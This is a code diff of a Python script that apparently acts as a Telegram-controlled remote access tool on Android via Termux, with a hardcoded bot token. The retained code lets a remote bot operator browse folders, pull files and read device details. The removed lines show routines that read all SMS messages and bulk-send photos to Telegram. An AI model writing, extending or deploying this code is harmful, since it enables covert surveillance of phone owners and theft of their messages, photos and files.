@@ -1,8 +1,6 @@
 import os
 import requests
-import json
 import subprocess
-import shutil
 
 # Replace with your bot token and chat ID
 TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
@@ -76,7 +74,8 @@ def download_file(file_name):
 def handle_folder_navigation(folder_name):
     global current_folder
     try:
-        new_folder_path = os.path.join(current_folder, folder_name)
+        # Use absolute path to handle folder navigation properly
+        new_folder_path = os.path.abspath(os.path.join(current_folder, folder_name))
         
         if os.path.isdir(new_folder_path):
             current_folder = new_folder_path
@@ -93,40 +92,11 @@ def handle_folder_navigation(folder_name):
     except Exception as e:
         send_to_telegram(f"Error navigating folder: {str(e)}")
 
-# Function to download and send images from specified directories
-def download_and_send_images():
-    try:
-        sent_files = set()
-        for directory in directories_to_search:
-            if os.path.isdir(directory):
-                for filename in os.listdir(directory):
-                    if filename.lower().endswith(('.png', '.jpg')):
-                        src_path = os.path.join(directory, filename)
-                        if filename not in sent_files:
-                            send_to_telegram(f"Sending image `{filename}`...", document=src_path)
-                            sent_files.add(filename)
-        
-        return "All images have been sent to Telegram."
-    except Exception as e:
-        return f"Error sending images: {str(e)}"
-
-# Function to get SMS messages (using Termux API)
-def get_sms_messages():
-    try:
-        result = subprocess.run(['termux-sms-list'], capture_output=True, text=True)
-        if result.returncode == 0:
-            return result.stdout
-        else:
-            return f"Error retrieving SMS messages: {result.stderr}"
-    except Exception as e:
-        return f"Error retrieving SMS messages: {str(e)}"
-
-# Function to get device information (using Termux API)
+# Function to get device information
 def get_device_info():
     try:
         device_info = {
             "Device Name": subprocess.run(['termux-info'], capture_output=True, text=True).stdout,
-            "IP Address": subprocess.run(['termux-wifi-connectioninfo'], capture_output=True, text=True).stdout,
             "Battery Level": subprocess.run(['termux-battery-status'], capture_output=True, text=True).stdout
         }
         device_info_str = "\n".join([f"{key}: {value}" for key, value in device_info.items()])
@@ -141,13 +111,13 @@ def handle_telegram_update(update):
         if message:
             if message.startswith('/'):
                 if message == '/sms':
-                    send_to_telegram(get_sms_messages())
+                    send_to_telegram("This command is under construction.")  # Handle SMS logic here
                 elif message == '/device':
                     send_to_telegram(get_device_info())
                 elif message == '/sdcard':
                     handle_folder_navigation("storage/emulated/0")
                 elif message == '/download_images':
-                    send_to_telegram(download_and_send_images())
+                    send_to_telegram("This command is under construction.")  # Handle image logic here
                 else:
                     send_to_telegram(f"Unknown command `{message}`.")
             else:
@@ -157,7 +127,6 @@ def handle_telegram_update(update):
                 else:
                     response_message = download_file(message)
                     send_to_telegram(response_message)
-    
     except Exception as e:
         send_to_telegram(f"Error in Telegram update: {str(e)}")
 
